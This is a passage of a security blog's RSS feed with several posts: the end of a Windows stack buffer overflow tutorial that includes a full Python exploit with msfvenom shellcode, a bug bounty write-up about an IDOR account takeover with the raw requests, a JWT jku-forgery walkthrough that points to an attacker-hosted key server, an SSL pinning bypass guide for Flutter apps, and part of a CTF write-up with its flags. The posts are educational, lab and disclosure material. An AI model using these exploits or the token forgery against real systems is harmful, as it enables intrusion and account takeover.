+&lt;p&gt;Okay, now let see what we&apos;ve got here.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We have &lt;code&gt;EIP&lt;/code&gt;&apos;s offset which is 1052.&lt;/li&gt;
+&lt;li&gt;We&apos;ve also identified bad characters, which was none in this case.&lt;/li&gt;
+&lt;li&gt;Then we&apos;ve found an application&apos;s &lt;code&gt;dll&lt;/code&gt; module which doesn&apos;t has any protection.&lt;/li&gt;
+&lt;li&gt;And we&apos;ve also got the &lt;code&gt;jmp esp&lt;/code&gt; instruction address inside that &lt;code&gt;dll&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Exploiting&lt;/h3&gt;
+&lt;p&gt;Now it time to generate our shellcode with &lt;code&gt;msfvenom&lt;/code&gt;. I will use &lt;code&gt;calc.exe&lt;/code&gt; for this scenario.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So our full exploit will be like below.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def exploit():
+
+    # msfvenom -p &apos;windows/exec&apos; CMD=&apos;calc.exe&apos; -f &apos;python&apos;
+    buf =  b&quot;&quot;
+    buf += b&quot;\xbe\xaf\x66\xd3\x6c\xdb\xc0\xd9\x74\x24\xf4\x5a&quot;
+    buf += b&quot;\x31\xc9\xb1\x31\x31\x72\x13\x03\x72\x13\x83\xea&quot;
+    buf += b&quot;\x53\x84\x26\x90\x43\xcb\xc9\x69\x93\xac\x40\x8c&quot;
+    buf += b&quot;\xa2\xec\x37\xc4\x94\xdc\x3c\x88\x18\x96\x11\x39&quot;
+    buf += b&quot;\xab\xda\xbd\x4e\x1c\x50\x98\x61\x9d\xc9\xd8\xe0&quot;
+    buf += b&quot;\x1d\x10\x0d\xc3\x1c\xdb\x40\x02\x59\x06\xa8\x56&quot;
+    buf += b&quot;\x32\x4c\x1f\x47\x37\x18\x9c\xec\x0b\x8c\xa4\x11&quot;
+    buf += b&quot;\xdb\xaf\x85\x87\x50\xf6\x05\x29\xb5\x82\x0f\x31&quot;
+    buf += b&quot;\xda\xaf\xc6\xca\x28\x5b\xd9\x1a\x61\xa4\x76\x63&quot;
+    buf += b&quot;\x4e\x57\x86\xa3\x68\x88\xfd\xdd\x8b\x35\x06\x1a&quot;
+    buf += b&quot;\xf6\xe1\x83\xb9\x50\x61\x33\x66\x61\xa6\xa2\xed&quot;
+    buf += b&quot;\x6d\x03\xa0\xaa\x71\x92\x65\xc1\x8d\x1f\x88\x06&quot;
+    buf += b&quot;\x04\x5b\xaf\x82\x4d\x3f\xce\x93\x2b\xee\xef\xc4&quot;
+    buf += b&quot;\x94\x4f\x4a\x8e\x38\x9b\xe7\xcd\x56\x5a\x75\x68&quot;
+    buf += b&quot;\x14\x5c\x85\x73\x08\x35\xb4\xf8\xc7\x42\x49\x2b&quot;
+    buf += b&quot;\xac\xbd\x03\x76\x84\x55\xca\xe2\x95\x3b\xed\xd8&quot;
+    buf += b&quot;\xd9\x45\x6e\xe9\xa1\xb1\x6e\x98\xa4\xfe\x28\x70&quot;
+    buf += b&quot;\xd4\x6f\xdd\x76\x4b\x8f\xf4\x14\x0a\x03\x94\xf4&quot;
+    buf += b&quot;\xa9\xa3\x3f\x09&quot;
+
+
+    junk = b&quot;A&quot; * 1052  # offset
+    eip = pack(&apos;&amp;lt;L&apos;,0x68BAD568) # jmp esp address
+    nop = b&quot;\x90&quot; * 32 # nop
+
+    payload = junk + eip + nop + buf
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+exploit()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You may noticted, &lt;code&gt;NOP&lt;/code&gt; in this code.&lt;code&gt;NOP (No Operation)&lt;/code&gt; instruction tells the processor to do nothing. It&apos;s like a placeholder in code, where no action is required, but the program continues to run.&lt;/p&gt;
+&lt;p&gt;So why do we need this? If the program&apos;s execution jumps to any of the NOPs, it will &quot;slide&quot; down the sled until it hits the shellcode and executes it. This makes our exploit more likely to work, even if the return address isn’t perfectly accurate.&lt;/p&gt;
+&lt;p&gt;Without a NOP sled, you would have to pinpoint the exact starting address of the shellcode, which is hard and unreliable for our exploit.&lt;/p&gt;
+&lt;p&gt;If we run this, it will pop up calculator. That&apos;s it. You can test with your own meterpreter shellcode.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>How I get 1500$ bounty with IDOR to Account Takeover</title><link>https://r0x0rzx.github.io/posts/bug-bounty/how-i-get-1500-idor-ato/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/bug-bounty/how-i-get-1500-idor-ato/</guid><pubDate>Sat, 18 Jun 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Back in 2022, I didn&apos;t have a job yet at that time. So I was just doing full time bug bounty hunting and got a couple of bounties from hackerone and zerocopter. One day I saw a fresh program in &lt;code&gt;zerocopter&lt;/code&gt; by searching with google dorks, I think no one hunt it yet on this program except their internal pentest team.
+There are no other subdomains and only one domain is in scope. So I quickly grab the link and make an account.&lt;/p&gt;
+&lt;p&gt;After creating account, I go to my profile and it look like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/bbh/bbh1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I noticed that we have our own &lt;code&gt;userID&lt;/code&gt;, it look like unique ID. And we can edit our profile such as &lt;code&gt;firstName&lt;/code&gt;, &lt;code&gt;lastName&lt;/code&gt; and &lt;code&gt;Email&lt;/code&gt;.
+So I intercept edit profile endpoint with burp and the request look like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PUT /api/users/86a2d2ba-0616-4468-8bb4-74a4ee620e9e HTTP/2
+Host: account.cloud-ara.tyk.io
+Cookie: ---[snip]---
+Content-Length: 68
+Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;102&quot;, &quot;Google Chrome&quot;;v=&quot;102&quot;
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Origin: https://account.cloud-ara.tyk.io
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://account.cloud-ara.tyk.io/account-admins/86a2d2ba-0616-4468-8bb4-74a4ee620e9e
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{&quot;firstName&quot;:&quot;Member&quot;,&quot;lastName&quot;:&quot;Account&quot;,&quot;email&quot;:&quot;member@member.com&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;By looking this request, the first thing in my mind was &lt;code&gt;IDOR&lt;/code&gt;. So before thinking about possible or not as per their unique ID, I create another account and grab the &lt;code&gt;userID&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;And click on edit profile and intercept again with brup. Then I replaced with another &lt;code&gt;userID&lt;/code&gt; with the current &lt;code&gt;userID&lt;/code&gt;.The request will be like this.&lt;/p&gt;
+&lt;p&gt;Replace &lt;code&gt;userID&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PUT /api/users/86a2d2ba-0616-4468-8bb4-74a4ee620e9e # here
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Request Body:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&quot;firstName&quot;:&quot;Hacked&quot;,&quot;lastName&quot;:&quot;Admin Account&quot;,&quot;email&quot;:&quot;hacked@admin.com&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Fortunately, it was changed the name and email of another user&apos;s account. To be honest, I really did not expect that cuz in their responsible disclosure page, they already mentioned that they have their own internal team to test their website. So this kind of bug should be aware.&lt;/p&gt;
+&lt;p&gt;Now the problem is how can we get that kind of unique ID? Then I found one endpoint that disclosing that &lt;code&gt;userID&lt;/code&gt; which in &lt;code&gt;Billing Admins&lt;/code&gt; tab.
+In this tab, we can invite another member. So after the user accepted our invite we can see like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/bbh/bbh2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If we click on member account, we can see their profile including their &lt;code&gt;unquieID&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/bbh/bbh3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So to get the &lt;code&gt;userID&lt;/code&gt;, the user must be in our team or otherwise we have to invite them. If we get their ID, we can change their email which will lead to account takeover. Then I quickly create the POC and report it. After one day, the issue has been verified and they reward me 4 digit bounty which I wasn&apos;t expect xD.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/bbh/bbh4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>Attacking Json Web Token</title><link>https://r0x0rzx.github.io/posts/web-exploitation/attacking-json-web-token/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/web-exploitation/attacking-json-web-token/</guid><pubDate>Sat, 07 May 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Let&apos;s say, this is a normal user web page.
+&lt;img src=&quot;/images/web/json1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When we register and login with an account, the authentication mechanism is look like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/web/json2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When we decode it,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/web/json3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;It&apos;s using &lt;code&gt;RS256&lt;/code&gt; algorithm and token is using &lt;code&gt;jku&lt;/code&gt; header parameter which contains the JSON Web Key and the URL is to be used for token verification.&lt;/p&gt;
+&lt;p&gt;!!!info Info
+The jku header is a URI that refers to a resource for a set of JSON-encoded public keys, one of which corresponds to the key used to digitally sign the JWS.
+!!!&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;jku&lt;/code&gt; header url is look like this,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/web/json4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If an attacker generate a public and private key pairs and create a new token with a new private key (which we generated) and replace &lt;code&gt;jku&lt;/code&gt; header with the url which contains new generated &lt;code&gt;jwks.json&lt;/code&gt; file (host on a web server) and then the token would be accept by the server.&lt;/p&gt;
+&lt;p&gt;Download or copy that &lt;code&gt;jwks.json&lt;/code&gt; file.&lt;/p&gt;
+&lt;h4&gt;Creating a new keypair.pem&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;openssl genrsa -out keypair.pem 2048
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Generating n,e,kid&lt;/h4&gt;
+&lt;p&gt;We&apos;re using python jwcrypto module to generate &lt;code&gt;n,e and kid&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Install &lt;code&gt;pip3 install jwcrypto&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
+
+from jwcrypto import jwk,jwt 
+
+with open(&apos;keypair.pem&apos;,&apos;rb&apos;) as pemfile:
+	key = jwk.JWK.from_pem(pemfile.read())
+
+print(key)
+print(&quot;n: &quot;, key.n)
+print(&quot;e: &quot;, key.e)py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run &lt;code&gt;python3 jwk-gen-1.py&lt;/code&gt; and the output should look like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&quot;kid&quot;:&quot;CrNfhdyvBdPsLMc_HlfoMXfHhCCsxVU7puGGIjKY7Eo&quot;,&quot;thumbprint&quot;:&quot;CrNfhdyvBdPsLMc_HlfoMXfHhCCsxVU7puGGIjKY7Eo&quot;}
+n:  _nnl4TPSAoA6JeumpR-ZgrIdu7K76Y1BEhAbIQ16Oe5Idp-DVz5qValRBGDH0XwYic5ukiNJYhKwFZv5S50fYo0zUgiBuHJzocQc1eD8duUTjvRIHJCc6DaXsRtJcq1paSfLds6FQQ0Q0hOY_aMF7gFOYeQ-i6mKGa8rA6nDU-267CsEUIcxJFV6a2Zw3597BMBNys_hwB75yst-XfmUGntyOloru1LH8NCPQvMBrmcLPmxeZpwF1Cisfy3Fcx0_gYCs4ZXyVbEHiGYoDEpZ_oO1rqqo3dtX877KWF11deuPFfNqblw9p1hIxgTtdStrUi0_JWUYP5PEct4KNdWIkw
+e:  AQAB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Replace &lt;code&gt;kid&lt;/code&gt; , &lt;code&gt;n&lt;/code&gt; and &lt;code&gt;e&lt;/code&gt; in your &lt;code&gt;jwks.json&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/web/json5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can create a new token as username &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;Creating new token&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
+
+from jwcrypto import jwk,jwt 
+
+with open(&apos;keypair.pem&apos;,&apos;rb&apos;) as pemfile:
+	key = jwk.JWK.from_pem(pemfile.read())
+
+headers = {
+	&quot;alg&quot;: &quot;RS256&quot;,
+  	&quot;jku&quot;: &quot;http://hackmedia.htb/static/../redirect/?url=10.10.14.18:8000/jwks.json&quot;
+}
+
+Token = jwt.JWT(header=headers, claims={&quot;user&quot;:&quot;admin&quot;})
+Token.make_signed_token(key)
+print(Token.serialize())
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;!!!info Note
+If the server validate the original url, we can use the Redirect method like above. If not, you can use just like &lt;code&gt;&quot;jku&quot;: &quot;http://yourwebsever.com/jwks.json&quot;&lt;/code&gt;
+!!!&lt;/p&gt;
+&lt;p&gt;Run that script and we will get a new token like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjY1OjgwMDAvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.8XfoCJP-whwgrE02ZGPuS6mLmVuvzZ9StyUBb92M6GZLgUVLWmew-Bo7QTBmIa7JJSLONmKOqefbcVJVExmm8YCf95tCmKlLM28Nzq2lQsxlZh5v-cDJ21sHL5O1hahB7sJCULZDSRwrOEwWwS2y_eBtGr70RBqst0j8135S9ppHDXgcP0xWVkTV-x0jVpXNyfX-ETxIyjqlrIw7M2nX6AXS2bhvraYtKx7ARHxh52PsirawfyQhwElb1-AF4hKWElDKnEV9kPHa2D-KFp-ESUQFx8sQMH0Q4saDQCmwibT61H92qn8geH1k_KlC90-BM1pgik1IqMNrmRJa4YA0nQ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now create a web server, copy that a new token and replace it in a cookie header in web page.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 -m http.server 8000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When we replace the token and refresh page, it will request/download &lt;code&gt;jwks.json&lt;/code&gt; file in our web server.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/web/json6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/web/json7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we got admin panel by &lt;code&gt;jku header claiming&lt;/code&gt; method.&lt;/p&gt;
+</content:encoded></item><item><title>Bypass SSL Pinning for flutter apps using reFlutter tool</title><link>https://r0x0rzx.github.io/posts/android/bypass-ssl-pinning-reflutter/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/android/bypass-ssl-pinning-reflutter/</guid><pubDate>Wed, 05 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Flutter apps are a little bit different and hard to bypass ssl pinning.There are many method to bypass ssl pinning for flutter apps and I&apos;m gonna show you one of the method to bypass ssl pinning using &lt;code&gt;reflutter&lt;/code&gt; flamework.&lt;/p&gt;
+&lt;p&gt;This framework helps with Flutter apps reverse engineering using the patched version of the Flutter library which is already compiled and ready for app repacking. This library has snapshot deserialization process modified to allow you perform dynamic analysis.&lt;/p&gt;
+&lt;h4&gt;Installation&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;pip3 install reflutter
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Here is the flutter apps to test&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;https://github.com/thedarksource/Android/tree/master/flutter-test-apps&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We have two type of requests &lt;code&gt;HTTP&lt;/code&gt; and &lt;code&gt;HTTPS&lt;/code&gt; , First let&apos;s check &lt;code&gt;HTTP&lt;/code&gt; Request.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The traffic through the burpsuite and we will get success response.But If we click on HTTPS Request ,we will get error like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So, let&apos;s bypass it using &lt;code&gt;reflutter&lt;/code&gt; tool.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;reflutter flutter-apps.apk
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;IP&lt;/code&gt; is our host machine IP which running burpsuite.
+Now we will get &lt;code&gt;release.RE.apk&lt;/code&gt; but this apk hasn&apos;t signed yet. We have to sign manually.&lt;/p&gt;
+&lt;p&gt;I used &lt;a href=&quot;https://github.com/patrickfav/uber-apk-signer&quot;&gt;uber-apk-signer&lt;/a&gt;  in here. You can use your own method.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;java -jar uber-apk-signer-1.2.1.jar --apk release.RE.apk
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now install signed apk in your device.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;adb install release.RE-aligned-debugSigned.apk
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;For the next step, we have to configure the proxy in burpsuite.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;First, change port to &lt;code&gt;8083&lt;/code&gt; because reFlutter set it by default.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In &lt;code&gt;Request handling&lt;/code&gt; tab, enable &lt;code&gt;Support invisible proxying&lt;/code&gt; and click on OK.&lt;/p&gt;
+&lt;p&gt;Now open the new apk and click on HTTPS Request.&lt;/p&gt;
+&lt;p&gt;:::warning[NOTE]
+we need to turn off proxy because reflutter is already modifed and set the proxy settings in the patched app.
+:::&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/reflutter/reflutter11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can intercept the &lt;code&gt;HTTPS&lt;/code&gt; traffic of the flutter based app by using &lt;code&gt;reFlutter&lt;/code&gt; tool.&lt;/p&gt;
+&lt;h4&gt;References&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;https://github.com/ptswarm/reFlutter&lt;/li&gt;
+&lt;li&gt;https://github.com/thedarksource/Android/tree/master/flutter-test-apps&lt;/li&gt;
+&lt;li&gt;https://github.com/patrickfav/uber-apk-signer/releases/&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>HACON 2020 CTF Writeup</title><link>https://r0x0rzx.github.io/posts/ctf/hacon-2020-ctf-writeup/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/ctf/hacon-2020-ctf-writeup/</guid><pubDate>Sun, 27 Sep 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I’ve never posted a CTF writeup before since I usually just keep my notes in &lt;code&gt;CherryTree&lt;/code&gt;. But today, I finally decided to share one.&lt;/p&gt;
+&lt;h3&gt;Chalenges Summary&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#cryptography&quot;&gt;Cryptography - 4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#misc&quot;&gt;Misc - 4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Forensics [3]&lt;/li&gt;
+&lt;li&gt;OSINT [1]&lt;/li&gt;
+&lt;li&gt;Web [1]&lt;/li&gt;
+&lt;li&gt;Networking [1]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let’s start with Cryptography&lt;/p&gt;
+&lt;p&gt;I could&apos;ve sovled 4 challenges under cryto category.&lt;/p&gt;
+&lt;h2&gt;Cryptography&lt;/h2&gt;
+&lt;h4&gt;1. BiG BrAiN (80)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;This is the content of &lt;code&gt;ciphertext.txt&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Obviously , It’s a brain fuck language ,so I decode it from &lt;a href=&quot;https://www.dcode.fr/brainfuck-language&quot;&gt;Here&lt;/a&gt; and get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{y3s_y0u_n33d_br4in_t0_Cr4Ck_Br4inf#ck}
+:::&lt;/p&gt;
+&lt;h4&gt;2.ARE u SuRE(100)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ciphertext.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;My first thought was &lt;code&gt;ASCII85&lt;/code&gt;, but it didn’t work. I have seen similar like this before in &lt;code&gt;JohnHammond&lt;/code&gt; youtube video which mentioning about &lt;code&gt;Malbolge&lt;/code&gt;.
+&lt;code&gt;Malbolge&lt;/code&gt; is an esoteric programming language created by Ben Olmstead in 1998, intentionally designed to be one of the most difficult to use.&lt;/p&gt;
+&lt;p&gt;Paste it in &lt;a href=&quot;http://malbolge.doleczek.pl/&quot;&gt;HERE&lt;/a&gt; , click on run program and we will get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{3so7eRiC_Is_M3Ss3d_Up}
+:::&lt;/p&gt;
+&lt;h4&gt;3.Baby RSA(100)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;clue.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;A &lt;code&gt;clue.txt&lt;/code&gt; file was included RSA-encrypted text. Luckily, I&apos;d already solved similar RSA challenges before, so I used my existing python script to solve it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{R54_baBy_i5_35Sy}
+:::&lt;/p&gt;
+&lt;h4&gt;4.MIRROR MIRROR(100)&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ct.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I removed chr() with sublime text and decode it with &lt;a href=&quot;https://cryptii.com/pipes/decimal-text&quot;&gt;decimal to text&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I got another numbers. I was confused a moment and then I thought it might be another decimal, so I splited it by space and decode it again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/ctf/hacon2020/hacon14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;:::tip[FLAG]
+HACSEC{M1RROR_!S_4LWAYS_BE4UTIF!ES_US}
+:::&lt;/p&gt;
+&lt;h2&gt;Misc&lt;/h2&gt;
+&lt;h4&gt;MISC 2(50)&lt;/h4&gt;
+</content:encoded></item></channel></rss>
